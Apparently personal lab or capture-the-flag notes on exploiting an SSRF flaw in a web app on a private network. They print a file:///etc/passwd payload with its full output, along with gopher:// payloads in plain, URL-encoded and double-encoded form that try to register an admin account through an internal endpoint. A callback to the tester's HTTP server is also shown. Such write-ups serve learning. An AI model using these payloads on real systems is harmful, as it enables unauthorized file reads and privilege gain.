- starting page, created login with `test:test`
![[Pasted image 20250106135339.png]]
once logged in found what looks like a potential `SSRF` vulnerability, going to test basic payload `file:///etc/passwd`
![[Pasted image 20250106135457.png]]
- got users
![[Pasted image 20250106135517.png]]
```bash 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
student:x:1000:1000:student:/home/student:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
postgres:x:113:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

![[Pasted image 20250106142557.png]]

![[Pasted image 20250106143559.png]]

there are no api's on this machine that would allow for admin creation, all i have right now is execution - has to be a file on the machine with a password
```bash
â”Œâ”€â”€(kaliã‰¿gobots)-[06Jan2025 19:51:42]-[/usr/â€¦/seclists/Discovery/Web-Content/api]
â””â”€$ ls
README.md              actions.txt            api-seen-in-wild.txt           objects-uppercase.txt
actions-lowercase.txt  api-endpoints-res.txt  ispsystem_billmanager_api.txt  objects.txt
actions-uppercase.txt  api-endpoints.txt      objects-lowercase.txt          salesforce-aura-objects.txt
```

tried `SSRF2Gopher` with these endpoints - unsuccessful
```bash
http://192.168.61.68/register?next=/adminpanel
http://192.168.61.68/login?next=/adminpanel
```
SSRF2GOpher
```bash
Created by eMVee 
    
[?] What is the address of the Host? 
127.0.0.1
[?] What port should be used for gopher? 
80
[?] What endpoint should be used for gopher? 
/register?next=/adminpanel
[?] What data would you like to post? 
username=admintest&password=admintest

[!] Plain text payload:


gopher://127.0.0.1:80/_POST /register?next=/adminpanel HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

username=admintest&password=admintest

[!] URL encoded payload:
gopher://127.0.0.1:80/_POST%20/register?next%3d/adminpanel%20HTTP/1.1%0aHost:%20127.0.0.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2037%0a%0ausername%3dadmintest%26password%3dadmintest

[!] Double URL encoded payload:
gopher%3a//127.0.0.1%3a80/_POST%2520/register?next%3d/adminpanel%2520HTTP/1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application/x-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

[!] Another option that might work via something like BURP:
gopher%3a%2F%2F127.0.0.1%3a80%2F_POST%2520%2Fregister?next%3d%2Fadminpanel%2520HTTP%2F1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application%2Fx-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

```
was able to curl over with the `SSRF` vulnerability
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 18:44:06]-[/home/kali/SUT/192.168.61.62]
â””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.61.68 - - [06/Jan/2025 18:44:25] code 404, message File not found
192.168.61.68 - - [06/Jan/2025 18:44:25] "GET /test HTTP/1.1" 404 -
127.0.0.1 - - [06/Jan/2025 20:07:30] code 501, message Unsupported method ('POST')
127.0.0.1 - - [06/Jan/2025 20:07:30] "POST / HTTP/1.1" 501 -
^C
Keyboard interrupt received, exiting.

```